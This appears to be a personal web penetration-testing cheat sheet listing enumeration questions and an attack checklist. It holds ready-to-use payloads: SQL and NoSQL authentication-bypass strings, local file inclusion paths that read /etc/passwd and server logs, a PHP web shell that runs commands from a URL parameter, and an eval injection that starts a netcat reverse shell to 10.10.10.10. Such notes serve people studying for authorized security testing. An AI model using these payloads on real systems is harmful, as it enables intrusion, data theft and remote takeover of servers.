
# Web Application Assessment Methodology
---

To start pen-testing a web application you must go with the mindset like this  : 
# Web Application Assessment Methodology
---
- What does the application do?
- What language is it written in?
- What server software is the application running on? 

# Web Application Enumeration
---
This part is where we must know the information about the software and stuff
- Programming language and frameworks
- Web Server Software
- Database software
- Server Operating System

# Web Checklist
---
This is a checklist for the default stuff in the web pen testing it's so interesting!

```bash
# Default Credentials
- /robots.txt
- admin/admin, admin/password, admin/machine-name, machine-name/machine-name
- Search on google for default credential of the application
- Hydra
- /Fuzz - applciation/Fuzz - index.php/fuzz
- Fuzz with extension(.txt,.conf,txt,html,php,asp,aspx,jsp,db,sql,exe,config,db
bak,cgi,ps1,py,ini,js,sh,.php,.txt,.json,.html
- SQL Bypass Auth
- Entry Point: ' '' ` ') ") `) ')) ")) `)) 
- Password Field: ' || ''==' ( No SQL Injection Payload )
- admin' or 1==1 
- ' or 1=1 -- -
- ' || 1=1 -- -
- whatweb -v
- Customize login password with array  (username=admin&password[]=)
- /index.[php,html,asp.aspx] or /randomthing-get-error
- LFI / Directory Traversal -> SSH key
- LFI / Configuration of Service File
- Checking eval() 2+2 2*2
- Checking with POST request
- WordPress Plugin vulnerable
- Check Source Code to Find Plugin install
- Looking for hostname and Zone Transfer
- ?file=/etc/passwd (absolute path)
- ?file=../../../etc/passwd - ?file=../../../../etc/passwd
- ?file=../../../../var/log/apache2/access.log
- ?file=../../../../var/www/html/index.php
```

**Also this included :**
```bash
#Success Login
- Version (Exploit-db)
- File Upload
- User privilege might change 
- Code execution directly a new post/page
- Module? Extension? Addons?
- Create own Module, extension, addone (Malicious)
- Access through CMS to sensitive database information credentaisl
- Can we schedule any system level jobs?
- Escalate to Administration privilege
- Diagnostic Tools - System Level Execute?
- Configuration File?
- Modify or Inject php code on existing file?
<?php
<pre>
passthru($_GET['cmd']);
</pre>
?>
- page=index');eval('phpinfo();');#
- page=index');eval("(system('nc 10.10.10.10 443 -e /bin/bash');");#

```
